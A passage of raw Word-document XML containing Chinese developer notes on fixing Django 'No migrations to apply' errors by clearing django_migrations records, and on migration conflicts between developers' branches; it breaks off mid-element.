      <w:r w:rsidRPr="009B62F8">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="000000"/>
          <w:kern w:val="36"/>
          <w:sz w:val="42"/>
          <w:szCs w:val="42"/>
        </w:rPr>
        <w:t>manage.py migrate</w:t>
      </w:r>
      <w:r w:rsidRPr="009B62F8">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="000000"/>
          <w:kern w:val="36"/>
          <w:sz w:val="42"/>
          <w:szCs w:val="42"/>
        </w:rPr>
        <w:t>无效的问题</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="598E4D3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问题描述：</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4334D34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已有的model，修改之后，想重新建模，于是将migrations文件夹中除__init__.py之外其他文件都删掉，再次执行以下步骤python manage.py makemigrations确认成功，执行python manage.py migrate，提示No migrations to apply. 表示一脸懵逼。再次修改，指定表名，再次尝试，发现问题依旧，表示二脸懵逼</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5C9B242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排查过程</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="46C63386"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python manage.py dbshell 进到数据库里面，查看是否表已存在 </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3CB3693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结果：表不存在</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="49D8D63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检查migrations文件 </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1E9E2D3C"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结果：文件没问题</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="353A0DF2"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百度 google 各种搜，乱投医，各种尝试</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0F35CAC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解决方案</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1DB0907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python manage.py dbshell 进到数据库中，执行delete </w:t>
      </w:r>
      <w:r w:rsidRPr="009B62F8">
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:eastAsia="宋体" w:hAnsi="宋体" w:cs="宋体"/>
          <w:color w:val="0000FF"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>from</w:t>
      </w:r>
      <w:r w:rsidRPr="009B62F8">
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:eastAsia="宋体" w:hAnsi="宋体" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> django_migrations where app=</w:t>
      </w:r>
      <w:r w:rsidRPr="009B62F8">
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:eastAsia="宋体" w:hAnsi="宋体" w:cs="宋体"/>
          <w:color w:val="800000"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>'your_appname'</w:t>
      </w:r>
      <w:r w:rsidRPr="009B62F8">
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:eastAsia="宋体" w:hAnsi="宋体" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="19A378E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python manage.py makemigrations(若migrations文件未删除，可不执行这一步)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2F6214E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python manage.py migrate 好啦，大功告成</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="60C9AE39"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原因分析</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="342DB0A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查看django_migrations表结构 </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="57DEB861"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建表语句： </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1654468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lastRenderedPageBreak/>
        <w:t xml:space="preserve">CREATE TABLE </w:t>
      </w:r>
      <w:r w:rsidRPr="009B62F8">
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:eastAsia="宋体" w:hAnsi="宋体" w:cs="宋体"/>
          <w:color w:val="800000"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>"django_migrations"</w:t>
      </w:r>
      <w:r w:rsidRPr="009B62F8">
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:eastAsia="宋体" w:hAnsi="宋体" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> (</w:t>
      </w:r>
      <w:r w:rsidRPr="009B62F8">
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:eastAsia="宋体" w:hAnsi="宋体" w:cs="宋体"/>
          <w:color w:val="800000"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>"id"</w:t>
      </w:r>
      <w:r w:rsidRPr="009B62F8">
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:eastAsia="宋体" w:hAnsi="宋体" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> integer NOT NULL PRIMARY KEY AUTOINCREMENT, </w:t>
      </w:r>
      <w:r w:rsidRPr="009B62F8">
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:eastAsia="宋体" w:hAnsi="宋体" w:cs="宋体"/>
          <w:color w:val="800000"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>"app"</w:t>
      </w:r>
      <w:r w:rsidRPr="009B62F8">
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:eastAsia="宋体" w:hAnsi="宋体" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> varchar(255) NOT NULL, </w:t>
      </w:r>
      <w:r w:rsidRPr="009B62F8">
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:eastAsia="宋体" w:hAnsi="宋体" w:cs="宋体"/>
          <w:color w:val="800000"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>"name"</w:t>
      </w:r>
      <w:r w:rsidRPr="009B62F8">
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:eastAsia="宋体" w:hAnsi="宋体" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> varchar(255) NOT NULL, </w:t>
      </w:r>
      <w:r w:rsidRPr="009B62F8">
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:eastAsia="宋体" w:hAnsi="宋体" w:cs="宋体"/>
          <w:color w:val="800000"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>"applied"</w:t>
      </w:r>
      <w:r w:rsidRPr="009B62F8">
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:eastAsia="宋体" w:hAnsi="宋体" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> datetime NOT NULL); </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3A230C2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原因 </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6D95FCD9"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造成多次应用migrations失败的原因是，当前model是修改过的，原来的migrations已经被我删除，但是，重新生成的migrations使用递增整数记名，所以，在django_migrations表中0001，0002等前面几个数字的文件都已被记录，在Django看来，被记录了就相当于已应用，所以，会出现刚开始的No migrations to apply.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2E11F204"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避免方案</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="017E4D90"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有强迫症删除migrations文件的同学(比如我)，请同时到数据库中删除相应记录</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6572331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没有强迫症的同学，可以继续生成新的migrations，旧的就不必理会了</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="691E4EB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题外话</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4ABEE6F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执行python manage.py migrate之后，可以使用python manage.py sqlmigrate appname migrations_num(例如python manage.py sqlmigrate user 0002)查看当前migrations文件对应的sql语句。 </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="18AEC6A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另外，在使用上述命令查看0002文件的sql语句时发现，django会新建一个表user_new，然后插入user表中的数据，再把user表删掉，再把user_new重命名为user。所以，修改model的时候，不必担心原有数据会丢失。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0407CE5C" w14:textId="77777777" w:rsidR="00B61AC7" w:rsidRPr="009B62F8"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临时解决：</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3A84632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在models中添加了一个model，makemigrations成功后，如果migrate提示no apply --》查看django——migrations是否有对应model的name记录，如果没有记录 --》删除model，再次makemigrations、migrate（提示无表，数据库中手动创建对应表名）--》再添加model，再次makemigrations、migrate即可</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="03DCD72B" w14:textId="77777777" w:rsidR="00B61AC7" w:rsidRPr="00EB10F9"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上述问题出现的根因：项目目录下面没有留存</w:t>
      </w:r>
      <w:r w:rsidRPr="009B62F8">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t xml:space="preserve">/migrations/ </w:t>
      </w:r>
      <w:r w:rsidRPr="009B62F8">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>文件夹及迁移文件，导致，每次项目迁移记得保存好这个目录的文件</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4A3733BC" w14:textId="77777777" w:rsidR="00B61AC7" w:rsidRPr="002941E1" w:rsidRDefault="00B61AC7" w:rsidP="00B61AC7">
      <w:pPr>
        <w:widowControl/>
        <w:jc w:val="center"/>
        <w:outlineLvl w:val="0"/>
        <w:rPr>
          <w:rFonts w:ascii="inherit" w:eastAsia="宋体" w:hAnsi="inherit" w:cs="宋体" w:hint="eastAsia"/>
          <w:color w:val="000000"/>
          <w:kern w:val="36"/>
          <w:sz w:val="36"/>
          <w:szCs w:val="36"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="002941E1">
        <w:rPr>
          <w:rFonts w:ascii="inherit" w:eastAsia="宋体" w:hAnsi="inherit" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="36"/>
          <w:sz w:val="36"/>
          <w:szCs w:val="36"/>
        </w:rPr>
        <w:t>解决</w:t>
      </w:r>
      <w:r w:rsidRPr="002941E1">
        <w:rPr>
          <w:rFonts w:ascii="inherit" w:eastAsia="宋体" w:hAnsi="inherit" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="36"/>
          <w:sz w:val="36"/>
          <w:szCs w:val="36"/>
        </w:rPr>
        <w:t>django</w:t>
      </w:r>
      <w:r w:rsidRPr="002941E1">
        <w:rPr>
          <w:rFonts w:ascii="inherit" w:eastAsia="宋体" w:hAnsi="inherit" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="36"/>
          <w:sz w:val="36"/>
          <w:szCs w:val="36"/>
        </w:rPr>
        <w:t>在多人开发时数据迁移的冲突</w:t>
      </w:r>
      <w:r w:rsidRPr="002941E1">
        <w:rPr>
          <w:rFonts w:ascii="inherit" w:eastAsia="宋体" w:hAnsi="inherit" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="36"/>
          <w:sz w:val="36"/>
          <w:szCs w:val="36"/>
        </w:rPr>
        <w:t>-migrations</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="42C88618" w14:textId="77777777" w:rsidR="00B61AC7" w:rsidRPr="002941E1" w:rsidRDefault="00B61AC7" w:rsidP="00B61AC7">
      <w:pPr>
        <w:widowControl/>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:before="360" w:after="360" w:line="300" w:lineRule="exact"/>
        <w:contextualSpacing/>
        <w:jc w:val="left"/>
        <w:outlineLvl w:val="3"/>
        <w:rPr>
          <w:rFonts w:ascii="inherit" w:eastAsia="宋体" w:hAnsi="inherit" w:cs="宋体" w:hint="eastAsia"/>
          <w:color w:val="404040"/>
          <w:kern w:val="0"/>
          <w:sz w:val="27"/>
          <w:szCs w:val="27"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="002941E1">
        <w:rPr>
          <w:rFonts w:ascii="inherit" w:eastAsia="宋体" w:hAnsi="inherit" w:cs="宋体"/>
          <w:color w:val="404040"/>
          <w:kern w:val="0"/>
          <w:sz w:val="27"/>
          <w:szCs w:val="27"/>
        </w:rPr>
        <w:t>应用场景</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="21CD158C" w14:textId="77777777" w:rsidR="00B61AC7" w:rsidRPr="002941E1" w:rsidRDefault="00B61AC7" w:rsidP="00B61AC7">
      <w:pPr>
        <w:widowControl/>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:before="360" w:after="360" w:line="300" w:lineRule="exact"/>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多个人使用</w:t>
      </w:r>
      <w:r w:rsidRPr="002941E1">
        <w:rPr>
          <w:rFonts w:ascii="Source Sans Pro" w:eastAsia="宋体" w:hAnsi="Source Sans Pro" w:cs="宋体"/>
          <w:color w:val="58666E"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>django</w:t>
      </w:r>
      <w:r w:rsidRPr="002941E1">
        <w:rPr>
          <w:rFonts w:ascii="Source Sans Pro" w:eastAsia="宋体" w:hAnsi="Source Sans Pro" w:cs="宋体"/>
          <w:color w:val="58666E"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>开发应用时，使用了</w:t>
      </w:r>
      <w:r w:rsidRPr="002941E1">
        <w:rPr>
          <w:rFonts w:ascii="Source Sans Pro" w:eastAsia="宋体" w:hAnsi="Source Sans Pro" w:cs="宋体"/>
          <w:color w:val="58666E"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>svn</w:t>
      </w:r>
      <w:r w:rsidRPr="002941E1">
        <w:rPr>
          <w:rFonts w:ascii="Source Sans Pro" w:eastAsia="宋体" w:hAnsi="Source Sans Pro" w:cs="宋体"/>
          <w:color w:val="58666E"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>做版本控制，但是每次一更新就比较头疼的事情发生了，就是数据迁移起冲突了。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="53C052A2" w14:textId="77777777" w:rsidR="00B61AC7" w:rsidRPr="002941E1" w:rsidRDefault="00B61AC7" w:rsidP="00B61AC7">
      <w:pPr>
        <w:widowControl/>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:before="360" w:after="360" w:line="300" w:lineRule="exact"/>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假设，我们有一个</w:t>
      </w:r>
      <w:r w:rsidRPr="002941E1">
        <w:rPr>
          <w:rFonts w:ascii="Source Sans Pro" w:eastAsia="宋体" w:hAnsi="Source Sans Pro" w:cs="宋体"/>
          <w:color w:val="58666E"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t xml:space="preserve"> blog </w:t>
      </w:r>
      <w:r w:rsidRPr="002941E1">
        <w:rPr>
          <w:rFonts w:ascii="Source Sans Pro" w:eastAsia="宋体" w:hAnsi="Source Sans Pro" w:cs="宋体"/>
          <w:color w:val="58666E"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>的</w:t>
      </w:r>
      <w:r w:rsidRPr="002941E1">
        <w:rPr>
          <w:rFonts w:ascii="Source Sans Pro" w:eastAsia="宋体" w:hAnsi="Source Sans Pro" w:cs="宋体"/>
          <w:color w:val="58666E"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t xml:space="preserve"> model </w:t>
      </w:r>
      <w:r w:rsidRPr="002941E1">
        <w:rPr>
          <w:rFonts w:ascii="Source Sans Pro" w:eastAsia="宋体" w:hAnsi="Source Sans Pro" w:cs="宋体"/>
          <w:color w:val="58666E"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>同时还有两个分支：</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="142EE23A" w14:textId="77777777" w:rsidR="00B61AC7" w:rsidRPr="002941E1" w:rsidRDefault="00B61AC7" w:rsidP="0049386C">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="50"/>
        </w:numPr>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"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分支</w:t>
      </w:r>
      <w:r w:rsidRPr="002941E1">
        <w:rPr>
          <w:rFonts w:ascii="Source Sans Pro" w:eastAsia="宋体" w:hAnsi="Source Sans Pro" w:cs="宋体"/>
          <w:color w:val="58666E"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>1</w:t>
      </w:r>
      <w:r w:rsidRPr="002941E1">
        <w:rPr>
          <w:rFonts w:ascii="Source Sans Pro" w:eastAsia="宋体" w:hAnsi="Source Sans Pro" w:cs="宋体"/>
          <w:color w:val="58666E"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>，</w:t>
      </w:r>
      <w:r w:rsidRPr="002941E1">
        <w:rPr>
          <w:rFonts w:ascii="Source Sans Pro" w:eastAsia="宋体" w:hAnsi="Source Sans Pro" w:cs="宋体"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="58666E"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>A</w:t>
      </w:r>
      <w:r w:rsidRPr="002941E1">
        <w:rPr>
          <w:rFonts w:ascii="Source Sans Pro" w:eastAsia="宋体" w:hAnsi="Source Sans Pro" w:cs="宋体"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="58666E"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>开发者</w:t>
      </w:r>
      <w:r w:rsidRPr="002941E1">
        <w:rPr>
          <w:rFonts w:ascii="Cambria" w:eastAsia="宋体" w:hAnsi="Cambria" w:cs="Cambria"/>
          <w:color w:val="58666E"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t> </w:t>
      </w:r>
      <w:r w:rsidRPr="002941E1">
        <w:rPr>
          <w:rFonts w:ascii="Source Sans Pro" w:eastAsia="宋体" w:hAnsi="Source Sans Pro" w:cs="宋体"/>
          <w:color w:val="58666E"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>添加一个</w:t>
      </w:r>
      <w:r w:rsidRPr="002941E1">
        <w:rPr>
          <w:rFonts w:ascii="Source Sans Pro" w:eastAsia="宋体" w:hAnsi="Source Sans Pro" w:cs="宋体"/>
          <w:color w:val="58666E"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t xml:space="preserve"> “author” </w:t>
      </w:r>
      <w:r w:rsidRPr="002941E1">
        <w:rPr>
          <w:rFonts w:ascii="Source Sans Pro" w:eastAsia="宋体" w:hAnsi="Source Sans Pro" w:cs="宋体"/>
          <w:color w:val="58666E"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>的字段到</w:t>
      </w:r>
      <w:r w:rsidRPr="002941E1">
        <w:rPr>
          <w:rFonts w:ascii="Source Sans Pro" w:eastAsia="宋体" w:hAnsi="Source Sans Pro" w:cs="宋体"/>
          <w:color w:val="58666E"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t xml:space="preserve"> blog Model </w:t>
      </w:r>
      <w:r w:rsidRPr="002941E1">
        <w:rPr>
          <w:rFonts w:ascii="Source Sans Pro" w:eastAsia="宋体" w:hAnsi="Source Sans Pro" w:cs="宋体"/>
          <w:color w:val="58666E"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>中，这样就有了</w:t>
      </w:r>
      <w:r w:rsidRPr="002941E1">
        <w:rPr>
          <w:rFonts w:ascii="Source Sans Pro" w:eastAsia="宋体" w:hAnsi="Source Sans Pro" w:cs="宋体"/>
          <w:color w:val="58666E"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t xml:space="preserve"> “migration 0003_blog_blog.py”</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="65A98896" w14:textId="77777777" w:rsidR="00B61AC7" w:rsidRPr="002941E1" w:rsidRDefault="00B61AC7" w:rsidP="0049386C">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="50"/>
        </w:numPr>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"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分支</w:t>
      </w:r>
      <w:r w:rsidRPr="002941E1">
        <w:rPr>
          <w:rFonts w:ascii="Source Sans Pro" w:eastAsia="宋体" w:hAnsi="Source Sans Pro" w:cs="宋体"/>
          <w:color w:val="58666E"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>2</w:t>
      </w:r>
      <w:r w:rsidRPr="002941E1">
        <w:rPr>
          <w:rFonts w:ascii="Source Sans Pro" w:eastAsia="宋体" w:hAnsi="Source Sans Pro" w:cs="宋体"/>
          <w:color w:val="58666E"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>，</w:t>
      </w:r>
      <w:r w:rsidRPr="002941E1">
        <w:rPr>
          <w:rFonts w:ascii="Source Sans Pro" w:eastAsia="宋体" w:hAnsi="Source Sans Pro" w:cs="宋体"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="58666E"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>B</w:t>
      </w:r>
      <w:r w:rsidRPr="002941E1">
        <w:rPr>
          <w:rFonts w:ascii="Source Sans Pro" w:eastAsia="宋体" w:hAnsi="Source Sans Pro" w:cs="宋体"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="58666E"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>开发者</w:t>
      </w:r>
      <w:r w:rsidRPr="002941E1">
        <w:rPr>
          <w:rFonts w:ascii="Cambria" w:eastAsia="宋体" w:hAnsi="Cambria" w:cs="Cambria"/>
          <w:color w:val="58666E"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t> </w:t>
      </w:r>
      <w:r w:rsidRPr="002941E1">
        <w:rPr>
          <w:rFonts w:ascii="Source Sans Pro" w:eastAsia="宋体" w:hAnsi="Source Sans Pro" w:cs="宋体"/>
          <w:color w:val="58666E"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>添加一个</w:t>
      </w:r>
      <w:r w:rsidRPr="002941E1">
        <w:rPr>
          <w:rFonts w:ascii="Source Sans Pro" w:eastAsia="宋体" w:hAnsi="Source Sans Pro" w:cs="宋体"/>
          <w:color w:val="58666E"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t xml:space="preserve"> “content” </w:t>
      </w:r>
      <w:r w:rsidRPr="002941E1">
        <w:rPr>
          <w:rFonts w:ascii="Source Sans Pro" w:eastAsia="宋体" w:hAnsi="Source Sans Pro" w:cs="宋体"/>
          <w:color w:val="58666E"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>字段到</w:t>
      </w:r>
      <w:r w:rsidRPr="002941E1">
        <w:rPr>
          <w:rFonts w:ascii="Source Sans Pro" w:eastAsia="宋体" w:hAnsi="Source Sans Pro" w:cs="宋体"/>
          <w:color w:val="58666E"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t xml:space="preserve"> blog Model </w:t>
      </w:r>
      <w:r w:rsidRPr="002941E1">
        <w:rPr>
          <w:rFonts w:ascii="Source Sans Pro" w:eastAsia="宋体" w:hAnsi="Source Sans Pro" w:cs="宋体"/>
          <w:color w:val="58666E"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>中，这样就有了</w:t>
      </w:r>
      <w:r w:rsidRPr="002941E1">
        <w:rPr>
          <w:rFonts w:ascii="Source Sans Pro" w:eastAsia="宋体" w:hAnsi="Source Sans Pro" w:cs="宋体"/>
          <w:color w:val="58666E"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t xml:space="preserve"> “0003_blog_content.py”</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="33E9C134" w14:textId="77777777" w:rsidR="00B61AC7" w:rsidRPr="002941E1" w:rsidRDefault="00B61AC7" w:rsidP="00B61AC7">
      <w:pPr>
        <w:widowControl/>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:before="360" w:after="360" w:line="400" w:lineRule="exact"/>
        <w:contextualSpacing/>
        <w:jc w:val="left"/>
        <w:rPr>
          <w:rFonts w:ascii="Source Sans Pro" w:eastAsia="宋体" w:hAnsi="Source Sans Pro" w:cs="宋体"/>
          <w:color w:val="58666E"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="002941E1">
        <w:rPr>
          <w:rFonts w:ascii="Source Sans Pro" w:eastAsia="宋体" w:hAnsi="Source Sans Pro" w:cs="宋体"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="58666E"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>那么问题来了，这两个</w:t>
      </w:r>
      <w:r w:rsidRPr="002941E1">
        <w:rPr>
          <w:rFonts w:ascii="Source Sans Pro" w:eastAsia="宋体" w:hAnsi="Source Sans Pro" w:cs="宋体"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="58666E"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t xml:space="preserve"> migration </w:t>
      </w:r>
      <w:r w:rsidRPr="002941E1">
        <w:rPr>
          <w:rFonts w:ascii="Source Sans Pro" w:eastAsia="宋体" w:hAnsi="Source Sans Pro" w:cs="宋体"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="58666E"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>文件都试图修改相同的</w:t>
      </w:r>
      <w:r w:rsidRPr="002941E1">
        <w:rPr>
          <w:rFonts w:ascii="Source Sans Pro" w:eastAsia="宋体" w:hAnsi="Source Sans Pro" w:cs="宋体"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="58666E"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t xml:space="preserve"> model</w:t>
      </w:r>
      <w:r w:rsidRPr="002941E1">
        <w:rPr>
          <w:rFonts w:ascii="Source Sans Pro" w:eastAsia="宋体" w:hAnsi="Source Sans Pro" w:cs="宋体"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="58666E"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>，而且都是以</w:t>
      </w:r>
      <w:r w:rsidRPr="002941E1">
        <w:rPr>
          <w:rFonts w:ascii="Source Sans Pro" w:eastAsia="宋体" w:hAnsi="Source Sans Pro" w:cs="宋体"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="58666E"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t xml:space="preserve"> “0003_” </w:t>
      </w:r>
      <w:r w:rsidRPr="002941E1">
        <w:rPr>
          <w:rFonts w:ascii="Source Sans Pro" w:eastAsia="宋体" w:hAnsi="Source Sans Pro" w:cs="宋体"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="58666E"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>命名的。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="29A5B225" w14:textId="77777777" w:rsidR="00B61AC7" w:rsidRPr="002941E1" w:rsidRDefault="00B61AC7" w:rsidP="00B61AC7">
      <w:pPr>
        <w:widowControl/>
